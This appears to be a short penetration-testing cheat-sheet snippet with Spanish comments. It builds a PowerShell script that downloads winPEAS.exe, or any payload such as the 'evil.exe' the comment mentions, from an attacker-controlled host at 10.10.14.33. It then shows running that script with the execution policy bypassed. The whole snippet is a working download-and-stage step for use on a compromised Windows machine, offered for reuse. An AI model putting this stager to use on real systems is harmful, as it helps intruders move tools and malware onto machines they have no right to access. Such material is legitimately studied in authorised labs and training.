::## Cambiar: IP, "evil.exe"
echo '$storageDir = $pwd' > wget.ps1
echo '$webclient = New-Object System.Net.WebClient' >> wget.ps1
echo '$url = "http://10.10.14.33:8000/winPEAS.exe"' >> wget.ps1
echo '$file = "winPEAS.exe"' >> wget.ps1
echo '$webclient.DownloadFile($url,$file)' >> wget.ps1

::## Usar:
::## cmd> powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
